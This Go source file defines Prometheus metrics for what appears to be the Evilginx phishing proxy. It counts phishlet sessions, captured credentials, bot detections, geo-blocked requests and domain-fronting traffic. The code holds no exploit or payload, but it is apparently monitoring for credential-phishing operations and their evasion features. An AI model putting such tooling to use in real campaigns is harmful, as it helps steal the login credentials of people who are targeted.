package monitoring

import (
	"net/http"
	"time"

	"github.com/prometheus/client_golang/prometheus"
	"github.com/prometheus/client_golang/prometheus/promhttp"
)

var (
	httpRequestsTotal = prometheus.NewCounterVec(
		prometheus.CounterOpts{
			Name: "evilginx_http_requests_total",
			Help: "Total number of HTTP requests",
		},
		[]string{"method", "path", "status"},
	)

	httpRequestDuration = prometheus.NewHistogramVec(
		prometheus.HistogramOpts{
			Name:    "evilginx_http_request_duration_seconds",
			Help:    "HTTP request duration in seconds",
			Buckets: prometheus.DefBuckets,
		},
		[]string{"method", "path"},
	)

	activeSessions = prometheus.NewGauge(
		prometheus.GaugeOpts{
			Name: "evilginx_active_sessions",
			Help: "Number of active sessions",
		},
	)

	sessionsTotal = prometheus.NewCounterVec(
		prometheus.CounterOpts{
			Name: "evilginx_sessions_total",
			Help: "Total number of sessions",
		},
		[]string{"phishlet", "status"},
	)

	credentialsCaptured = prometheus.NewCounterVec(
		prometheus.CounterOpts{
			Name: "evilginx_credentials_captured_total",
			Help: "Total number of credentials captured",
		},
		[]string{"phishlet", "type"},
	)

	blockedRequests = prometheus.NewCounterVec(
		prometheus.CounterOpts{
			Name: "evilginx_blocked_requests_total",
			Help: "Total number of blocked requests",
		},
		[]string{"reason", "country"},
	)

	botDetections = prometheus.NewCounterVec(
		prometheus.CounterOpts{
			Name: "evilginx_bot_detections_total",
			Help: "Total number of bot detections",
		},
		[]string{"type", "user_agent"},
	)

	domainFrontingRequests = prometheus.NewCounterVec(
		prometheus.CounterOpts{
			Name: "evilginx_domain_fronting_requests_total",
			Help: "Total number of domain fronting requests",
		},
		[]string{"provider", "status"},
	)

	uptime = prometheus.NewGauge(
		prometheus.GaugeOpts{
			Name: "evilginx_uptime_seconds",
			Help: "Uptime in seconds",
		},
	)

	memoryUsage = prometheus.NewGauge(
		prometheus.GaugeOpts{
			Name: "evilginx_memory_usage_bytes",
			Help: "Memory usage in bytes",
		},
	)
)

type MetricsCollector struct {
	startTime time.Time
}

func NewMetricsCollector() *MetricsCollector {
	collector := &MetricsCollector{
		startTime: time.Now(),
	}

	prometheus.MustRegister(
		httpRequestsTotal,
		httpRequestDuration,
		activeSessions,
		sessionsTotal,
		credentialsCaptured,
		blockedRequests,
		botDetections,
		domainFrontingRequests,
		uptime,
		memoryUsage,
	)

	go collector.collectSystemMetrics()

	return collector
}

func (mc *MetricsCollector) collectSystemMetrics() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		uptime.Set(time.Since(mc.startTime).Seconds())
	}
}

func (mc *MetricsCollector) RecordHTTPRequest(method, path, status string, duration time.Duration) {
	httpRequestsTotal.WithLabelValues(method, path, status).Inc()
	httpRequestDuration.WithLabelValues(method, path).Observe(duration.Seconds())
}

func (mc *MetricsCollector) SetActiveSessions(count int) {
	activeSessions.Set(float64(count))
}

func (mc *MetricsCollector) RecordSession(phishlet, status string) {
	sessionsTotal.WithLabelValues(phishlet, status).Inc()
}

func (mc *MetricsCollector) RecordCredentialCapture(phishlet, credType string) {
	credentialsCaptured.WithLabelValues(phishlet, credType).Inc()
}

func (mc *MetricsCollector) RecordBlockedRequest(reason, country string) {
	blockedRequests.WithLabelValues(reason, country).Inc()
}

func (mc *MetricsCollector) RecordBotDetection(detectionType, userAgent string) {
	botDetections.WithLabelValues(detectionType, userAgent).Inc()
}

func (mc *MetricsCollector) RecordDomainFrontingRequest(provider, status string) {
	domainFrontingRequests.WithLabelValues(provider, status).Inc()
}

func (mc *MetricsCollector) Handler() http.Handler {
	return promhttp.Handler()
}

func (mc *MetricsCollector) HTTPMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		start := time.Now()
		
		wrapped := &responseWriter{ResponseWriter: w, statusCode: http.StatusOK}
		
		next.ServeHTTP(wrapped, r)
		
		duration := time.Since(start)
		mc.RecordHTTPRequest(r.Method, r.URL.Path, http.StatusText(wrapped.statusCode), duration)
	})
}

type responseWriter struct {
	http.ResponseWriter
	statusCode int
}

func (rw *responseWriter) WriteHeader(code int) {
	rw.statusCode = code
	rw.ResponseWriter.WriteHeader(code)
}
